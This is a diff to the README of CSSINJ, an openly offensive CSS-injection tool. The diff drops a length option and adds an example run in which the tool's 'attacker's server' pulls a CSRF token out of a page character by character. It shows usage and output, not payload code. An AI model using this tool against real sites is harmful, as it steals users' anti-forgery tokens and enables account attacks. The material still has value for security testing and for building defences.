@@ -33,7 +33,7 @@ Now you’re ready to use **CSSINJ**! 🎯
 ## Usage  
 
 ```bash
-python3 CSSINJ.py [-h] -H HOSTNAME -p PORT -i IDENTIFIER -l LENGTH
+python3 CSSINJ.py [-h] -H HOSTNAME -p PORT -i IDENTIFIER
 ```
 
 ### Options  
@@ -44,17 +44,36 @@ python3 CSSINJ.py [-h] -H HOSTNAME -p PORT -i IDENTIFIER -l LENGTH
 | `-H, --hostname`       | Attacker hostname or IP address             |
 | `-p, --port`           | Port number of the attacker                 |
 | `-i, --identifier`     | CSS identifier (CSS selector) to extract data |
-| `-l, --length`         | Length of data to extract                   |
 
 ### Example  
 
 ```bash
-python3 CSSINJ.py  -H 127.0.0.1 -p 5005 -i input.here -l 10
+~ python3 CSSINJ.py -H 127.0.0.1 -p 5005 -i input.csrf
+  _____   _____   _____  _____  _   _       _     _____  __     __
+ / ____| / ____| / ____||_   _|| \ | |     | |   |  __ \ \ \   / /
+| |     | (___  | (___    | |  |  \| |     | |   | |__) | \ \_/ /
+| |      \___ \  \___ \   | |  | . ` | _   | |   |  ___/   \   /
+| |____  ____) | ____) | _| |_ | |\  || |__| | _ | |        | |
+ \_____||_____/ |_____/ |_____||_| \_| \____/ (_)|_|        |_|
+
+[✓] Attacker's server started on 127.0.0.1:5005
+======== Running on http://0.0.0.0:5005 ========
+(Press CTRL+C to quit)
+[✓] Connection from ::1
+[ⓘ] Token is M
+[ⓘ] Token is My
+[ⓘ] Token is MyC
+[ⓘ] Token is MyCS
+[ⓘ] Token is MyCSS
+[ⓘ] Token is MyCSSR
+[ⓘ] Token is MyCSSRF
+[ⓘ] Token is MyCSSRFT
+[ⓘ] Token is MyCSSRFTO
+[ⓘ] Token is MyCSSRFTOK
+[ⓘ] Token is MyCSSRFTOKE
+[ⓘ] Token is MyCSSRFTOKEN
+[✓] The token is : MyCSSRFTOKEN
 ```
-
-## Todo
-
-- [ ] Fix recursivity
 
 ## Disclaimer  
 
